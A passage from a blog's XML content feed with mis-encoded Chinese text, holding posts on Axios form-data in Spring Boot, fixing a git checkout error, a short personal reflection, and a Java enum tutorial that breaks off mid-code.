class="hljs-number">351</span><br>follower_id<span class="hljs-selector-attr">[1]</span>: <span class="hljs-number">66</span><br>concat_material<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[fname]</span>: è§†é¢‘è®¢å•<span class="hljs-selector-class">.xls</span><br>concat_material<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[key]</span>: local/other/<span class="hljs-number">099</span>f4be38fb8e69bb031cbc36ed283a6<span class="hljs-selector-class">.xls</span><br>concat_material<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[fname]</span>: è§†é¢‘è®¢å•<span class="hljs-number">1</span><span class="hljs-selector-class">.xls</span><br>concat_material<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[key]</span>: local/other/<span class="hljs-number">099</span>f4be38fb8e69bb031cbc36ed283a8.xls<br></code></pre></td></tr></table></figure><p>åœ¨springbootå¼€å‘æ—¶</p><ol><li><strong>Fromdata</strong>ä½¿ç”¨æ³¨è§£ <code>@RequestParam</code> ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>servletRequest.getAttribute(&quot;å‚æ•°å&quot;)</code>è·å–</li><li>Jsonä½¿ç”¨æ³¨è§£ <code>@RequestBody</code></li></ol>]]></content>
    
    
    <categories>
      
      <category>å‰ç«¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ajax</tag>
      
      <tag>Axios</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gitè§£å†³error-The following untracked working tree files would be overwritten by checkout</title>
    <link href="/2022/11/29/git%E8%A7%A3%E5%86%B3error%20The%20following%20untracked%20working%20tree%20files%20would%20be%20overwritten%20by%20checkout/"/>
    <url>/2022/11/29/git%E8%A7%A3%E5%86%B3error%20The%20following%20untracked%20working%20tree%20files%20would%20be%20overwritten%20by%20checkout/</url>
    
    <content type="html"><![CDATA[<h3 id="The-following-untracked-working-tree-files-would-be-overwritten-by-checkout"><a href="#The-following-untracked-working-tree-files-would-be-overwritten-by-checkout" class="headerlink" title="The following untracked working tree files would be overwritten by checkout:"></a>The following untracked working tree files would be overwritten by checkout:</h3><blockquote><p>å¯èƒ½åªèƒ½è§£å†³æˆ‘ä¸€ä¸ªæˆ‘çš„é—®é¢˜</p></blockquote><p>ç½‘ä¸Šå¤§éƒ½è¯´æ˜¯ä»€ä¹ˆåˆ‡æ¢åˆ†æ”¯æ—¶å‡ºç°è¿™ä¸ªé”™è¯¯ã€‚wnmï¼Œæˆ‘å°±ä¸€ä¸ªåˆ†æ”¯Masterã€‚</p><p>æ£€æŸ¥åå‡ åˆ†é’Ÿå‘ç°</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221129090836068.png" alt="image-20221129090836068"></p><blockquote><p><strong>Gç›˜</strong>é‡Œçš„<strong>Javacode</strong>æ‰æ˜¯æˆ‘å¹³æ—¶ç”¨åˆ°çš„æ–‡ä»¶å¤¹ã€‚è¯¥ç›®å½•ä¸‹ <code>.git</code> ä¸­çš„ä¿¡æ¯æ‰å’Œgitè¿œç¨‹ä»“åº“ä¿¡æ¯ä¸€è‡´ã€‚</p></blockquote><blockquote><p><strong>Fç›˜</strong>ä¸‹<strong>Javacode</strong>ï¼Œæ˜¯æˆ‘å¥½ä¹…ä¹‹å‰gitç‰ˆæœ¬å›é€€çš„å¤‡ä»½ã€‚</p></blockquote><ol><li><p>åŸå› ï¼š</p><p>æˆ‘åœ¨<strong>Fç›˜</strong>ä¸‹<strong>Javacode</strong>æ–°å»ºäº†ä¸€ä¸ªé¡¹ç›®(ç³Šæ¶‚å•Š :sob::sob::sob:ï¼‰ï¼Œåœ¨pushå°±å‡ºç°<code>The following untracked working tree files would be overwritten by checkout:</code></p></li><li><p>è§£å†³ï¼š</p><p>æŠŠæ–°å»ºçš„é¡¹ç›®ç§»åŠ¨åˆ°<strong>Gç›˜</strong>é‡Œçš„<strong>Javacode</strong>ï¼Œé‡æ–°add commit push è¿œç¨‹ä»“åº“æäº¤æˆåŠŸ</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å°é—®é¢˜</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æˆ‘çš„1128_01</title>
    <link href="/2022/11/29/%E6%88%91%E7%9A%841128-01/"/>
    <url>/2022/11/29/%E6%88%91%E7%9A%841128-01/</url>
    
    <content type="html"><![CDATA[<h1 id="è¿™ä¸€å¹´"><a class="markdownIt-Anchor" href="#è¿™ä¸€å¹´"></a> è¿™ä¸€å¹´</h1><p>ğŸ±</p><p>çœŸæ­£çš„å¼€å§‹è®¡ç®—æœºçš„å­¦ä¹ ï¼ï¼ï¼</p><p>â€‹å¼€å§‹å·äº† ğŸ˜œğŸ˜œğŸ˜œ</p><p>å¼€å§‹çœ‹äº†èœ¡ç¬”å°æ–°ï¼Œæˆä¸ºèœ¡ç¬”å°æ–°çš„å¿ å®ç²‰ä¸ ï¼ï¼ï¼</p><p>â€‹å¥½ä¸‹é¥­ â€‹ ğŸ˜ğŸ˜ğŸ˜</p><p>å’Œè€æœ‹å‹è”ç³»å˜å°‘äº†è®¸å¤šï¼Œå¶å°”è”ç³»çš„è¯ï¼ŒåˆèŠå¾—ä¼šå¿˜è®°æ—¶é—´ï¼Œå¤šäº†å‡ ä¸ªæ–°æœ‹å‹ ï¼ï¼ï¼</p><p>â€‹å‹è°Šä¸‡å² â˜ºï¸â˜ºï¸â˜ºï¸</p>]]></content>
    
    
    <categories>
      
      <category>è®°å½•ç±»</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Java-æšä¸¾(enum)</title>
    <link href="/2022/11/28/%E6%9E%9A%E4%B8%BE-enum/"/>
    <url>/2022/11/28/%E6%9E%9A%E4%B8%BE-enum/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-æšä¸¾-enum"><a href="#Java-æšä¸¾-enum" class="headerlink" title="Java æšä¸¾(enum)"></a>Java æšä¸¾(enum)</h1><p>Java æšä¸¾æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ç±»ï¼Œä¸€èˆ¬è¡¨ç¤ºä¸€ç»„å¸¸é‡ï¼Œæ¯”å¦‚ä¸€å¹´çš„ 4 ä¸ªå­£èŠ‚ï¼Œä¸€ä¸ªå¹´çš„ 12 ä¸ªæœˆä»½ï¼Œä¸€ä¸ªæ˜ŸæœŸçš„ 7 å¤©ï¼Œæ–¹å‘æœ‰ä¸œå—è¥¿åŒ—ç­‰ã€‚</p><p>Java æšä¸¾ç±»ä½¿ç”¨ enum å…³é”®å­—æ¥å®šä¹‰ï¼Œå„ä¸ªå¸¸é‡ä½¿ç”¨é€—å· <strong>,</strong> æ¥åˆ†å‰²ã€‚</p><h2 id="å®šä¹‰ä¸€ä¸ªæšä¸¾"><a href="#å®šä¹‰ä¸€ä¸ªæšä¸¾" class="headerlink" title="å®šä¹‰ä¸€ä¸ªæšä¸¾"></a>å®šä¹‰ä¸€ä¸ªæšä¸¾</h2><p>ä¾‹å¦‚å®šä¹‰ä¸€ä¸ªé¢œè‰²çš„æšä¸¾ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span> <br>&#123; <br>    RED, GREEN, BLUE; <br>&#125; <br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šæšä¸¾ç±» Color é¢œè‰²å¸¸é‡æœ‰ RED, GREEN, BLUEï¼Œåˆ†åˆ«è¡¨ç¤ºçº¢è‰²ï¼Œç»¿è‰²ï¼Œè“è‰²ã€‚</p><p>ä½¿ç”¨å®ä¾‹ï¼š</p><p>å®ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span><br>&#123;<br>    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span><br>    &#123;<br>        RED, GREEN, BLUE;<br>    &#125;<br> <br>    <span class="hljs-comment">// æ‰§è¡Œè¾“å‡ºç»“æœ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>    &#123;<br>        <span class="hljs-type">Color</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Color.RED;<br>        System.out.println(c1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸Šä»£ç è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">RED</span><br></code></pre></td></tr></table></figure><h2 id="å†…éƒ¨ç±»ä¸­ä½¿ç”¨æšä¸¾"><a href="#å†…éƒ¨ç±»ä¸­ä½¿ç”¨æšä¸¾" class="headerlink" title="å†…éƒ¨ç±»ä¸­ä½¿ç”¨æšä¸¾"></a>å†…éƒ¨ç±»ä¸­ä½¿ç”¨æšä¸¾</h2><p>æšä¸¾ç±»ä¹Ÿå¯ä»¥å£°æ˜åœ¨å†…éƒ¨ç±»ä¸­ï¼š</p><p>å®ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span><br>&#123;<br>    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span><br>    &#123;<br>        RED, GREEN, BLUE;<br>    &#125;<br> <br>    <span class="hljs-comment">// æ‰§è¡Œè¾“å‡ºç»“æœ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>    &#123;<br>        <span class="hljs-type">Color</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Color.RED;<br>        System.out.println(c1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸Šä»£ç è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">RED</span><br></code></pre></td></tr></table></figure><p>æ¯ä¸ªæšä¸¾éƒ½æ˜¯é€šè¿‡ Class åœ¨å†…éƒ¨å®ç°çš„ï¼Œä¸”æ‰€æœ‰çš„æšä¸¾å€¼éƒ½æ˜¯ public static final çš„ã€‚</p><p>ä»¥ä¸Šçš„æšä¸¾ç±» Color è½¬åŒ–åœ¨å†…éƒ¨ç±»å®ç°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Color</span><br>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Color</span> <span class="hljs-variable">RED</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>();<br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Color</span> <span class="hljs-variable">BLUE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>();<br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Color</span> <span class="hljs-variable">GREEN</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="è¿­ä»£æšä¸¾å…ƒç´ "><a href="#è¿­ä»£æšä¸¾å…ƒç´ " class="headerlink" title="è¿­ä»£æšä¸¾å…ƒç´ "></a>è¿­ä»£æšä¸¾å…ƒç´ </h2><p>å¯ä»¥ä½¿ç”¨ for è¯­å¥æ¥è¿­ä»£æšä¸¾å…ƒç´ ï¼š</p><p>å®ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span><br>&#123;<br>    RED, GREEN, BLUE;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-keyword">for</span> (Color myVar : Color.values()) &#123;<br>      System.out.println(myVar);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸Šä»£ç è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">RED</span><br><span class="hljs-attribute">GREEN</span><br><span class="hljs-attribute">BLUE</span><br></code></pre></td></tr></table></figure><h2 id="åœ¨-switch-ä¸­ä½¿ç”¨æšä¸¾ç±»"><a href="#åœ¨-switch-ä¸­ä½¿ç”¨æšä¸¾ç±»" class="headerlink" title="åœ¨ switch ä¸­ä½¿ç”¨æšä¸¾ç±»"></a>åœ¨ switch ä¸­ä½¿ç”¨æšä¸¾ç±»</h2><p>æšä¸¾ç±»å¸¸åº”ç”¨äº switch è¯­å¥ä¸­ï¼š</p><p>å®ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span><br>&#123;<br>    RED, GREEN, BLUE;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">Color</span> <span class="hljs-variable">myVar</span> <span class="hljs-operator">=</span> Color.BLUE;<br><br>    <span class="hljs-keyword">switch</span>(myVar) &#123;<br>      <span class="hljs-keyword">case</span> RED:<br>        System.out.println(<span class="hljs-string">&quot;çº¢è‰²&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> GREEN:<br>         System.out.println(<span class="hljs-string">&quot;ç»¿è‰²&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> BLUE:<br>        System.out.println(<span class="hljs-string">&quot;è“è‰²&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸Šä»£ç è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">è“è‰²<br></code></pre></td></tr></table></figure><h2 id="values-ordinal-valueOf-å’ŒcompareTo-æ–¹æ³•"><a href="#values-ordinal-valueOf-å’ŒcompareTo-æ–¹æ³•" class="headerlink" title="values(), ordinal() , valueOf()å’ŒcompareTo() æ–¹æ³•"></a>values(), ordinal() , valueOf()å’ŒcompareTo() æ–¹æ³•</h2><p>enum å®šä¹‰çš„æšä¸¾ç±»é»˜è®¤ç»§æ‰¿äº† java.lang.Enum ç±»ï¼Œå¹¶å®ç°äº† java.lang.Serializable å’Œ java.lang.Comparable ä¸¤ä¸ªæ¥å£ã€‚</p><p>Java ä¸­çš„æ¯ä¸€ä¸ªæšä¸¾éƒ½ç»§æ‰¿è‡ª java.lang.Enum ç±»ã€‚å½“å®šä¹‰ä¸€ä¸ªæšä¸¾ç±»å‹æ—¶ï¼Œæ¯ä¸€ä¸ªæšä¸¾ç±»å‹æˆå‘˜éƒ½å¯ä»¥çœ‹ä½œæ˜¯ Enum ç±»çš„å®ä¾‹ï¼Œè¿™äº›æšä¸¾æˆå‘˜é»˜è®¤éƒ½è¢« finalã€public, static ä¿®é¥°ï¼Œå½“ä½¿ç”¨æšä¸¾ç±»å‹æˆå‘˜æ—¶ï¼Œç›´æ¥ä½¿ç”¨æšä¸¾åç§°è°ƒç”¨æˆå‘˜å³å¯ã€‚</p><p>æ‰€æœ‰æšä¸¾å®ä¾‹éƒ½å¯ä»¥è°ƒç”¨ Enum ç±»çš„æ–¹æ³•ï¼Œå¸¸ç”¨æ–¹æ³•å¦‚è¡¨ 1 æ‰€ç¤ºã€‚</p><table><thead><tr><th>æ–¹æ³•åç§°</th><th>æè¿°</th></tr></thead><tbody><tr><td>values()</td><td>ä»¥æ•°ç»„å½¢å¼è¿”å›æšä¸¾ç±»å‹çš„æ‰€æœ‰æˆå‘˜</td></tr><tr><td>valueOf()</td><td>å°†æ™®é€šå­—ç¬¦ä¸²è½¬æ¢ä¸ºæšä¸¾å®ä¾‹</td></tr><tr><td>compareTo()</td><td>æ¯”è¾ƒä¸¤ä¸ªæšä¸¾æˆå‘˜åœ¨å®šä¹‰æ—¶çš„é¡ºåº</td></tr><tr><td>ordinal()</td><td>è·å–æšä¸¾æˆå‘˜çš„ç´¢å¼•ä½ç½®</td></tr></tbody></table><p>å®ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestEnum</span> &#123;<br>    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span> &#123;<br>        <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªæšä¸¾</span><br>        RED, GREEN, BLUE;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// è°ƒç”¨ values()</span><br>        Color[] arr = Color.values();<br><br>        <span class="hljs-comment">// è¿­ä»£æšä¸¾</span><br>        <span class="hljs-keyword">for</span> (Color col : arr) &#123;<br>            <span class="hljs-comment">// æŸ¥çœ‹ç´¢å¼•</span><br>            System.out.println(col + <span class="hljs-string">&quot; at index &quot;</span> + col.ordinal());<br>        &#125;<br><br>        <span class="hljs-comment">// ä½¿ç”¨ valueOf() è¿”å›æšä¸¾å¸¸é‡ï¼Œä¸å­˜åœ¨çš„ä¼šæŠ¥é”™ IllegalArgumentException</span><br>        System.out.println(Color.valueOf(<span class="hljs-string">&quot;RED&quot;</span>));<br>        System.out.println(Color.valueOf(<span class="hljs-string">&quot;BLUE&quot;</span>));<br>        compare(Color.valueOf(<span class="hljs-string">&quot;GREEN&quot;</span>));<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Color s)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; Color.values().length; i++) &#123;<br>            <span class="hljs-comment">//è°ƒç”¨compareTo()æ¯”è¾ƒ</span><br>            System.out.println(s + <span class="hljs-string">&quot;ä¸&quot;</span> + Color.values()[i] + <span class="hljs-string">&quot;çš„æ¯”è¾ƒç»“æœæ˜¯ï¼š&quot;</span> + s.compareTo(Color.values()[i]));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœä¸ºï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">RED</span> at index <span class="hljs-number">0</span><br><span class="hljs-attribute">GREEN</span> at index <span class="hljs-number">1</span><br><span class="hljs-attribute">BLUE</span> at index <span class="hljs-number">2</span><br><span class="hljs-attribute">RED</span><br><span class="hljs-attribute">BLUE</span><br><span class="hljs-attribute">GREEN</span>ä¸REDçš„æ¯”è¾ƒç»“æœæ˜¯ï¼š<span class="hljs-number">1</span><br><span class="hljs-attribute">GREEN</span>ä¸GREENçš„æ¯”è¾ƒç»“æœæ˜¯ï¼š<span class="hljs-number">0</span><br><span class="hljs-attribute">GREEN</span>ä¸BLUEçš„æ¯”è¾ƒç»“æœæ˜¯ï¼š-<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="æšä¸¾ç±»æˆå‘˜"><a href="#æšä¸¾ç±»æˆå‘˜" class="headerlink" title="æšä¸¾ç±»æˆå‘˜"></a>æšä¸¾ç±»æˆå‘˜</h2><p>æšä¸¾è·Ÿæ™®é€šç±»ä¸€æ ·å¯ä»¥ç”¨è‡ªå·±çš„å˜é‡ã€æ–¹æ³•å’Œæ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°åªèƒ½ä½¿ç”¨ private è®¿é—®ä¿®é¥°ç¬¦ï¼Œæ‰€ä»¥å¤–éƒ¨æ— æ³•è°ƒç”¨ã€‚</p><p>æšä¸¾æ—¢å¯ä»¥åŒ…å«å…·ä½“æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥åŒ…å«æŠ½è±¡æ–¹æ³•ã€‚ å¦‚æœæšä¸¾ç±»å…·æœ‰æŠ½è±¡æ–¹æ³•ï¼Œåˆ™æšä¸¾ç±»çš„æ¯ä¸ªå®ä¾‹éƒ½å¿…é¡»å®ç°å®ƒã€‚</p><p>å®ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span><br>&#123;<br>    RED, GREEN, BLUE;<br> <br>    <span class="hljs-comment">// æ„é€ å‡½æ•°</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Color</span><span class="hljs-params">()</span><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;Constructor called for : &quot;</span> + <span class="hljs-built_in">this</span>.toString());<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">colorInfo</span><span class="hljs-params">()</span><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;Universal Color&quot;</span>);<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span><br>&#123;    <br>    <span class="hljs-comment">// è¾“å‡º</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>    &#123;<br>        <span class="hljs-type">Color</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Color.RED;<br>        System.out.println(c1);<br>        c1.colorInfo();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸Šä»£ç è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-function"><span class="hljs-keyword">Constructor</span> <span class="hljs-title">called</span> <span class="hljs-title">for</span> :</span> RED<br><span class="hljs-function"><span class="hljs-keyword">Constructor</span> <span class="hljs-title">called</span> <span class="hljs-title">for</span> :</span> GREEN<br><span class="hljs-function"><span class="hljs-keyword">Constructor</span> <span class="hljs-title">called</span> <span class="hljs-title">for</span> :</span> BLUE<br>RED<br>Universal Color<br></code></pre></td></tr></table></figure><h2 id="ä¸ºæšä¸¾æ·»åŠ æ–¹æ³•"><a href="#ä¸ºæšä¸¾æ·»åŠ æ–¹æ³•" class="headerlink" title="ä¸ºæšä¸¾æ·»åŠ æ–¹æ³•"></a>ä¸ºæšä¸¾æ·»åŠ æ–¹æ³•</h2><p>Java ä¸ºæšä¸¾ç±»å‹æä¾›äº†ä¸€äº›å†…ç½®çš„æ–¹æ³•ï¼ŒåŒæ—¶æšä¸¾å¸¸é‡ä¹Ÿå¯ä»¥æœ‰è‡ªå·±çš„æ–¹æ³•ã€‚æ­¤æ—¶è¦æ³¨æ„å¿…é¡»åœ¨æšä¸¾å®ä¾‹çš„æœ€åä¸€ä¸ªæˆå‘˜åæ·»åŠ åˆ†å·ï¼Œè€Œä¸”å¿…é¡»å…ˆå®šä¹‰æšä¸¾å®ä¾‹ã€‚</p><p>å®ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">WeekDay</span> &#123;<br>    <span class="hljs-comment">//ä»¥ä¸Šæ˜¯æšä¸¾çš„æˆå‘˜ï¼Œå¿…é¡»å…ˆå®šä¹‰ï¼Œè€Œä¸”ä½¿ç”¨åˆ†å·ç»“æŸ</span><br>    Mon(<span class="hljs-string">&quot;Monday&quot;</span>), Tue(<span class="hljs-string">&quot;Tuesday&quot;</span>), Wed(<span class="hljs-string">&quot;Wednesday&quot;</span>), Thu(<span class="hljs-string">&quot;Thursday&quot;</span>), Fri(<span class="hljs-string">&quot;Friday&quot;</span>), Sat(<span class="hljs-string">&quot;Saturday&quot;</span>), Sun(<span 